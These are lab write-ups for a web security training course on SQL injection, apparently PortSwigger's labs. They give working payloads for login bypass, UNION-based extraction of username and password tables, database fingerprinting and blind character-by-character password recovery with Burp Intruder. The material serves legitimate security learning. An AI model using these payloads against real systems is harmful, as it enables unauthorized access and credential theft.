# Labs

## SQL injection

1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
2. [SQL injection vulnerability allowing login bypass](#sql-injection-vulnerability-allowing-login-bypass)
3. [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
4. [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
5. [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
6. [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
7. [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)
8. [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
9. [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
10. [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
11. [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```text
URL - /filter?category=Gifts

Required - SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Query - Gifts' OR 1=1--
```

### SQL injection vulnerability allowing login bypass

```text
Navigate to my account

In login page,
username - administrator'--

Commenting out the query after username
```

### SQL injection UNION attack, determining the number of columns returned by the query

```text
Select any category filter

Start by query - Pets' UNION SELECT NULL--

Keep appending NULL until no error

Required query - Pets' UNION SELECT NULL,NULL,NULL--
```

### SQL injection UNION attack, finding a column containing text

```text
Under category filter,

first we have to find number of columns

required query - Gifts' UNION SELECT NULL,NULL,NULL--

Now, we need to find which column contains text

Start replacing each NULL by a string

required query - Gifts' UNION SELECT NULL,'a',NULL--

replace 'a' with string to be outputted
```

### SQL injection UNION attack, retrieving data from other tables

```text
Under category filter,

We need to find username, password from users table

Required query - Gifts' UNION SELECT username,password FROM users--

This gives us administrator's password, then we just need to login
```

### SQL injection UNION attack, retrieving multiple values in a single column

```text
Under category filter,

First find number of columns required

Required query - Gifts' ORDER BY 3--

As this query gives us an error, we know only 2 columns are used

Next, we need to find which column supports text

Start with query - Gifts' UNION SELECT NULL,NULL--

Required query - Gifts' UNION SELECT NULL,'a'--

Now, we need to get username and password in single column

Required query - Gifts' UNION SELECT NULL,username||'~'||password FROM users--

This gives us password for logging in.
```

### SQL injection attack, querying the database type and version on Oracle

```text
As we are in a Oracle database, we need to use payloads aptly

We need to use 'FROM' in every Oracle query, so we can use 'dual' table

First, finding number of columns

Required query - Gifts' UNION SELECT NULL,NULL FROM dual--

Now, finding which column is of string type

Required query - Gifts' UNION SELECT 'a','a' FROM dual--

Both columns support text type so we can use any one of them to print version data

Using 'SELECT banner FROM v$version' payload,

Required query - Gifts' UNION SELECT 'a',banner FROM v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

```text
Select the category filter

We can use Burp Suite to capture the request, forward it to Repeater as we will have multiple modifications

Initially, we need to find number of columns

Required query - Pets' UNION SELECT NULL,NULL#

Here, we need to URL-encode the queries otherwise they won't work

Next, we need to find data-type of columns

Required query - Pets' UNION SELECT 'a','a'#

Finally, we need to query version type.

Do URL-encode the queries in Burp Suite.

Required query - ' UNION SELECT @@version,NULL#
```

### SQL injection attack, listing the database contents on non-Oracle databases

```text
First, find number of columns

Payload - Pets' ORDER BY 1--

Starting from 1, we increment it until it gives error (at 3). So we know that there are 2 columns

Confirm this using another payload.

Payload - Pets' UNION SELECT NULL,NULL--

Now, we need to confirm datatypes of columns

Payload - Pets' UNION SELECT 'a','a'--

Now, we need to list contents of database

Payload - Pets' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--

This outputs a lot of tables, but we need to find the one with usernames and passwords

After that, we need to find the required columns

Payload - Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pegreq'--

This gives the two required column names for table.
Now, we need to output the content of those two columns

Required payload - Pets' UNION SELECT username_njreoo,password_srfoyr FROM users_pegreq--

This gives the password for administrator, which can be used to login
```

### SQL injection attack, listing the database contents on Oracle

```text
Select any category filter; we need to find the number of columns.

We can intercept the request and send it to Repeater in Burp Suite for convenience.

(All payloads have to be sent URL-encoded)
Payload - Pets' ORDER BY 1--

Starting from 1, increment it until it gives error - here we get Internal Server error at 3.

So, there are 2 columns - we need to find the datatypes of these columns.

As it is an Oracle database, we need to use 'FROM' with 'UNION', so we can use a dummy table like 'dual'

Payload - Pets' UNION SELECT 'a','a' FROM dual--

This does not give us an error, so we can attempt to list contents of the database.

Payload - Pets' UNION SELECT TABLE_NAME,NULL FROM all_tables--

Now, we have the table 'USERS_FIORQD', but we do not have column names.
Following the Oracle format, we need to print the column names for this table.

Payload - Pets' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_FIORQD'--

This gives us the two column names we require for users and passwords; we can now print the contents of these two columns.

Payload - Pets' UNION SELECT PASSWORD_CHMJXC,USERNAME_HJDKPR FROM USERS_FIORQD--

This gives the password for 'administrator' - use it to login.
```

### Blind SQL injection with conditional responses

```text
In the lab home page, we can see the phrase 'Welcome back!' - this means we have access to our account.

We can test this by first intercepting & capturing the request using Burp Suite and forwarding it to Repeater.

In the request, there is a cookie section, which contains a 'TrackingId' field - we can use our payload here to check for blind SQLi.

Payloads -
    xyz' AND '1'='1
    xyz' AND '1'='2

The first payload is always true, so when we use it, the 'Welcome back!' string is still there in Response.

However, the second payload is always false, so using this payload gives Response without the required string.

We can now proceed to find the password, character-by-character; we are given that the table 'users' contains 'username' and 'password' columns and we need to find for user 'administrator'.

Payload - xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm

This is false (since Response does not contain string "Welcome back!"), so first letter of password is lesser than 'm'

Payload - xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'd

This is also false; using trial-and-error we can find that the first letter of password is 'b'

Payload - xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b

Now, we can determine the length of the password; we will be using a similar approach.

Payload - xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

Now, this returns true, which means our password length is more than 1 character.

We can try this, fuzzing the value with different numbers, or we can automate it using Intruder.

Send the captured request from Repeater to Intruder, then clear the payload positions.
Add payload position at the number position (for password length check).

Keeping the attack type 'Sniper', navigate to Payloads tab - choose Payload type as Numbers, and add a sequential number range from 1 to 30 (1 step) - this means we are checking for password lengths from 1 to 30.

We can start the attack, this shows multiple requests with different payloads.
However, after the payload 20, the length of response changes - this indicates that password length is not greater than 20 (check response to confirm).

So, password length is equal to 20.

We can start fuzzing the characters one-by-one using Intruder in a similar fashion.
However, we will have two positions in payload to be modified - the substring start position, and the alphanumeric character for password.

So in Intruder, we will be using the Cluster Bomb attack.

Payload - xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Forward the request to Intruder, add 2 payload positions - 1st for position parameter of substring function, and 2nd for the character to be bruteforced.

Here, we will be only considering lowercase alphabets and numbers.

For 1st payload position - set of numbers, range 1-20 with 1 step.
For 2nd payload position - set of 'Brute forcer', with min & max length of 1 (one character at a time).

Running the attack will take some time, so we can wait for it to finish.

Once the attack ends, we can use 'Length' column to filter by the size of response.
The 1st Payload column will indicate the character position in password.

We can concatenate the characters accordingly to get the password for administrator user, followed by login.
```
